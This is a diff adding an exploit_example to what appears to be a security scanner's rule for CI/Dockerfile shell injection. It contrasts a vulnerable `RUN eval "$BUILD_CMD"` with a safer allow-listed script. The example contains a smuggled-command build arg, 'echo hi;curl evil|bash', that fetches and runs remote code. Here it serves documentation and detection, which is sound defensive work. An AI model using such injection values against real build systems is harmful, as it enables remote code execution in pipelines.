@@ -26,6 +26,24 @@ RULE = Rule(
         "by GHA-028 / GL-026 / BB-026 / ADO-027 / CC-027 / JF-030 so "
         "the safe / unsafe vocabulary matches across the tool."
     ),
+    exploit_example=(
+        "# Vulnerable: ``eval`` on a build arg, or ``sh -c`` on an\n"
+        "# unquoted variable, gives the value full shell-grammar\n"
+        "# reach. A build arg passed via ``docker build --build-arg\n"
+        "# BUILD_CMD='echo hi;curl evil|bash'`` runs the curl in\n"
+        "# the build context.\n"
+        "FROM alpine@sha256:abc123...\n"
+        "ARG BUILD_CMD\n"
+        "RUN eval \"$BUILD_CMD\"\n"
+        "\n"
+        "# Safe: replace dynamic shell evaluation with a script you\n"
+        "# own that validates the arg against an allow-list, or\n"
+        "# remove the indirection entirely (hard-code the build\n"
+        "# steps).\n"
+        "FROM alpine@sha256:abc123...\n"
+        "ARG TARGET=staging\n"
+        "RUN ./scripts/build-for-target.sh \"$TARGET\""
+    ),
 )
 
 
